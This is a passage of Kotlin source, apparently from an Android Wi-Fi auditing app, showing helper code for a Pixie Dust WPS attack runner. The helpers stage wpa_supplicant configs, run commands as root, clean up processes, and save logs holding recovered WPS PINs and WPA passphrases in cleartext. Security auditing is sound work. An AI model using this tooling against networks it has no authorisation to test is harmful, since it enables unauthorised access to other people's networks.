        return line?.trim()?.removePrefix("psk=")?.trim('"')?.trim()?.takeIf { it.isNotBlank() }
    }

    private fun parsePskFromConfig(): String? {
        // El config vive en el directorio de control, no en filesDir: se lee
        // a través de `su` porque la app no tiene acceso SELinux a esa ruta.
        val conf = NativeBinaries.runtimeConfigPath()
        val result = execSu("cat $conf 2>/dev/null", timeoutSeconds = 3)
        if (result.exitCode != 0) return null
        return result.output.lineSequence()
            .map { it.trim() }
            .filter { it.startsWith("psk=") }
            .map { it.removePrefix("psk=").trim('"').trim() }
            .firstOrNull { it.isNotBlank() }
    }

    /**
     * Prepara el config del supplicant en el directorio de control.
     *
     * No basta con `-O`: ese flag solo *sobrescribe* el parámetro
     * `ctrl_interface`; si el config no lo declara, wpa_supplicant no crea
     * ningún socket. El asset solo trae `ctrl_interface_group`, así que aquí
     * se genera un config completo con la ruta real (vendor o legacy).
     *
     * El fichero se envía por stdin porque el dominio SELinux de `su` no
     * puede leer filesDir.
     */
    private fun stageSupplicantConfig(ctrlDir: String, log: (String) -> Unit): Boolean {
        val source = File(
            NativeBinaries.binaryDir(context),
            NativeBinaries.WPA_SUPPLICANT_CONF
        )
        if (!source.exists() || source.length() == 0L) {
            log("[-] Falta ${source.absolutePath}")
            return false
        }

        // Conservar otras opciones del asset, pero descartar las variantes de
        // ctrl_interface para no duplicar directivas con la ruta runtime.
        val extraOptions = source.readLines()
            .map { it.trim() }
            .filter {
                it.isNotEmpty() &&
                    !it.startsWith("ctrl_interface=") &&
                    !it.startsWith("ctrl_interface_group=")
            }
        val content = buildString {
            appendLine("ctrl_interface=DIR=$ctrlDir GROUP=wifi")
            extraOptions.forEach { appendLine(it) }
        }

        val target = NativeBinaries.runtimeConfigPath()
        val staged = File(context.cacheDir, "wpa_supplicant.runtime.conf")
        return try {
            staged.writeText(content)
            val result = ShellExecutor.execRootWithInput(
                command = "cat > $target && chmod 644 $target",
                input = staged,
                timeoutMs = 5000
            )
            if (result.exitCode != 0) {
                val detail = result.error.ifBlank { result.output }.ifBlank { "exit=${result.exitCode}" }
                log("[-] No se pudo copiar el config a $target: $detail")
                false
            } else {
                log("[+] Config del supplicant preparado en $target (ctrl_interface=$ctrlDir)")
                true
            }
        } catch (e: Exception) {
            ShellExecutor.logE(TAG, "No se pudo preparar el config del supplicant", e)
            log("[-] No se pudo preparar el config del supplicant: ${e.message}")
            false
        } finally {
            staged.delete()
        }
    }

    // ========================================================================
    // Utilidades de shell y limpieza
    // ========================================================================

    /**
     * Ejecuta un comando vía su y retorna el resultado.
     * Reusa ShellExecutor.execRoot (eliminada duplicación con PixieDustViewModel).
     */
    private fun execSu(command: String, timeoutSeconds: Int): ShellExecutor.Result =
        ShellExecutor.execRoot(command, timeoutSeconds * 1000L)

    private fun runSuWithTimeout(command: String, timeoutSeconds: Int): ShellExecutor.Result {
        return try {
            // El watchdog mata el comando si supera el timeout, pero solo si
            // el PID sigue siendo el mismo (starttime de /proc/<pid>/stat).
            // Sin esa comprobación, un PID reutilizado tras terminar el comando
            // podría recibir un kill como root. Su salida va a /dev/null para
            // no mantener abierto el pipe que lee ShellExecutor.
            val wrapped =
                "($command & pid=\$!; " +
                    "start=\$(cut -d' ' -f22 /proc/\$pid/stat 2>/dev/null); " +
                    "( sleep $timeoutSeconds; [ -n \"\$start\" ] && " +
                    "[ \"\$(cut -d' ' -f22 /proc/\$pid/stat 2>/dev/null)\" = \"\$start\" ] && " +
                    "kill \$pid 2>/dev/null ) >/dev/null 2>&1 & wait \$pid)"
            ShellExecutor.execRoot(wrapped, timeoutSeconds * 1000L)
        } catch (e: Exception) {
            Log.w(TAG, "Command failed/timed out: $command", e)
            ShellExecutor.Result(-1, "", e.message ?: "Unknown error")
        }
    }

    private suspend fun waitForSocket(
        socketPath: String,
        timeoutMs: Long,
        log: (String) -> Unit
    ): Boolean {
        log("[*] Waiting for wpa_supplicant socket: $socketPath ($timeoutMs ms)...")
        val start = System.currentTimeMillis()
        val deadline = start + timeoutMs
        var attempts = 0
        while (System.currentTimeMillis() < deadline) {
            attempts++
            try {
                val r = execSu("test -S $socketPath && echo OK", timeoutSeconds = 2)
                if (r.output.lines().any { it.trim() == "OK" }) {
                    log("[+] Socket ready: $socketPath (attempt $attempts)")
                    return true
                }
            } catch (_: Exception) {}
            if (attempts % 4 == 0) {
                log("[*]   ... still waiting for socket (${System.currentTimeMillis() - start} ms elapsed)")
            }
            delay(300)
        }
        log("[-] Socket wait timed out: $socketPath ($attempts attempts)")
        return false
    }

    /**
     * Mata el supplicant de una ronda y cualquier hijo que haya quedado vivo.
     * `Process.destroy()` solo termina el wrapper `su`; el binario real sigue
     * en ejecución hasta que expira su `sleep 110`, lo que dejaría dos
     * supplicants compitiendo por la misma interfaz en la ronda siguiente.
     */
    private fun stopSupplicant(process: Process?) {
        process?.let {
            it.destroy()
            try {
                it.waitForCompat(1_000L)
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
            }
        }
        // Se ancla al inicio del cmdline para no matar al wrapper `su` que
        // ejecuta este mismo pkill (su cmdline contiene la ruta como texto).
        val supplicantPath = NativeBinaries.resolveBinaryPath(
            context,
            NativeBinaries.wpaSupplicantAssetName()
        )
        try {
            execSu(
                "pkill -9 -f '^${supplicantPath}( |$)' 2>/dev/null",
                timeoutSeconds = 3
            )
        } catch (_: Exception) {
            // Best effort.
        }
    }

    /**
     * La limpieza puede invocarse a la vez desde [runAttack] (finally) y desde
     * [cancel] (hilo de la UI). Se serializa para que `svc wifi enable` no se
     * ejecute dos veces y para que dos `pkill`/`rm -rf` no se pisen.
     */
    @Synchronized
    private fun cleanup() {
        stage(PixieDustStage.RESTORING)
        try {
            val dir = NativeBinaries.binaryDir(context)
            // Solo los binarios que lanzamos nosotros (cmdline empieza por su
            // ruta); nunca el supplicant del sistema ni el wrapper `su`.
            execSu(
                "pkill -9 -f '^$dir/(wpa_supplicant|wpa_cli|pixiewps)' 2>/dev/null",
                timeoutSeconds = 3
            )
            execSu("rm -rf ${NativeBinaries.ctrlDir()} 2>/dev/null", timeoutSeconds = 3)
        } catch (_: Exception) {}
        if (wifiDisabledByAttack) {
            wifiDisabledByAttack = false
            val r = execSu("svc wifi enable 2>/dev/null", timeoutSeconds = 5)
            log("[*] Cleanup: svc wifi enable -> exit=${r.exitCode}")
        }
        log("[*] Cleanup done")
    }

    private fun log(message: String) {
        Log.d(TAG, message)
        auditEvents.add(message)
        onLog(message)
    }

    /** Notifica un hito de progreso a la UI; nunca debe romper la auditoría. */
    private fun stage(value: PixieDustStage) {
        try {
            onStage(value)
        } catch (e: Exception) {
            ShellExecutor.logW(TAG, "Stage callback failed: $value (${e.message})")
        }
    }

    /**
     * Guarda el estado y los logs del ataque Pixie Dust en
     * /sdcard/AmWF/pixie-logs/ para análisis offline.
     *
     * La escritura se hace con `su` porque en Android 11+ la app no puede
     * crear directorios arbitrarios en /sdcard sin MANAGE_EXTERNAL_STORAGE.
     * Si el dispositivo no tiene root o /sdcard no está disponible, se cae
     * de regreso al directorio privado de la app (filesDir/pixie-logs), que
     * no se borra al limpiar la caché.
     *
     * El fichero contiene:
     *   - Marca de tiempo formateada
     *   - BSSID, SSID, frecuencia e interfaz del objetivo
     *   - Resultado (éxito/falla) y razón
     *   - PIN WPS y PSK WPA si se obtuvieron
     *   - Eventos de la app y salida cruda de wpa_supplicant/wpa_cli/pixiewps
     */
    private fun saveAuditLog(
        result: PixieDustResult?,
        target: AuditTarget,
        eventLines: List<String>,
        rawLines: List<String>
    ) {
        // Milisegundos para que dos ataques que terminen en el mismo segundo
        // no se sobrescriban (el requisito es conservar todos los logs).
        val timestamp = java.text.SimpleDateFormat(
            "yyyyMMdd_HHmmss_SSS",
            java.util.Locale.US
        ).format(java.util.Date())
        val safeBssid = target.bssid.replace(":", "")
        val fileName = "pixie_${timestamp}_$safeBssid.log"

        val content = buildString {
            appendLine("=== AmWF Pixie Dust Audit Log ===")
            appendLine("AVISO: contiene credenciales WPS/WPA en texto claro; protégelo.")
            appendLine("Fecha: ${java.util.Date()}")
            appendLine("BSSID: ${target.bssid}")
            appendLine("SSID: ${target.ssid?.takeIf { it.isNotBlank() } ?: "(desconocido)"}")
            appendLine("Frecuencia: ${target.freqMHz?.let { "$it MHz" } ?: "(desconocida)"}")
            appendLine("Interfaz: ${target.interfaceName}")
            appendLine("Arquitectura: ${Build.SUPPORTED_ABIS.firstOrNull() ?: "desconocida"}")
            when (result) {
                is PixieDustResult.Success -> {
                    appendLine("Resultado: ÉXITO")
                    appendLine("PIN WPS: ${result.wpsPin ?: "N/A"}")
                    appendLine("PSK WPA: ${result.wpaPsk ?: "N/A"}")
                }
                is PixieDustResult.Failure -> {
                    appendLine("Resultado: FALLA")
                    appendLine("Razón: ${result.reason}")
                }
                null -> appendLine("Resultado: SIN RESULTADO (ataque cancelado o interrumpido)")
            }
            appendLine()
            appendLine("=== Eventos de la app ===")
            eventLines.forEach { appendLine(it) }
            appendLine()
            appendLine("=== Salida cruda (wpa_supplicant / wpa_cli / pixiewps) ===")
            rawLines.forEach { appendLine(it) }
            appendLine()
            appendLine("=== Fin del log ===")
        }

        // 1) Ruta principal: /sdcard/AmWF/pixie-logs/ mediante root.
        val sdcardDir = "/sdcard/AmWF/pixie-logs"
        val sdcardPath = "$sdcardDir/$fileName"
        val staged = File(context.cacheDir, fileName)
        try {
            staged.writeText(content)
            val written = ShellExecutor.execRootWithInput(
                command = "mkdir -p $sdcardDir && cat > $sdcardPath && chmod 644 $sdcardPath",
                input = staged,
                timeoutMs = 10_000
            )
            if (written.exitCode == 0) {
                log("[+] Log de auditoría guardado en: $sdcardPath")
                return
            }
            val detail = written.error.ifBlank { written.output }
                .ifBlank { "exit=${written.exitCode}" }
            ShellExecutor.logW(TAG, "No se pudo escribir el log en $sdcardPath: $detail")
        } catch (e: Exception) {
            ShellExecutor.logE(TAG, "Error escribiendo el log en $sdcardPath", e)
        } finally {
            staged.delete()
        }

        // 2) Fallback: almacenamiento privado de la app. filesDir no se
        // limpia automáticamente como cacheDir, así que el log sobrevive.
        try {
            val fallbackDir = File(context.filesDir, "pixie-logs")
            if (!fallbackDir.exists() && !fallbackDir.mkdirs()) {
                ShellExecutor.logE(TAG, "No se pudo crear ${fallbackDir.absolutePath}")
                return
            }
            val fallbackFile = File(fallbackDir, fileName)
            fallbackFile.writeText(content)
            log("[+] Log guardado en directorio privado: ${fallbackFile.absolutePath}")
        } catch (e: Exception) {
            ShellExecutor.logE(TAG, "Fallo también el guardado en directorio privado", e)
        }
    }

    // ========================================================================
    // Clases de soporte internas
    // ========================================================================

    private class SupplicantHandle(
        val process: Process,
        val lines: BlockingQueue<String>
    )

    /** Datos del objetivo que acompañan a todo log de auditoría. */
    private data class AuditTarget(
        val bssid: String,
        val ssid: String?,
        val freqMHz: Int?,
        val interfaceName: String
    )

    private data class M3Attempt(
        val data: M3Parser.M3Data?,
        val failureReason: String?,
        val m5m7: M3Parser.M5M7Capture?,
        /** true si el AP terminó la negociación y no tiene sentido reintentar. */
        val terminal: Boolean = false
    )

    companion object {
        private const val TAG = "PixieDustRunner"
        private const val PROCESS_EOF = "\u0000AMWF_PROCESS_EOF"
    }
}
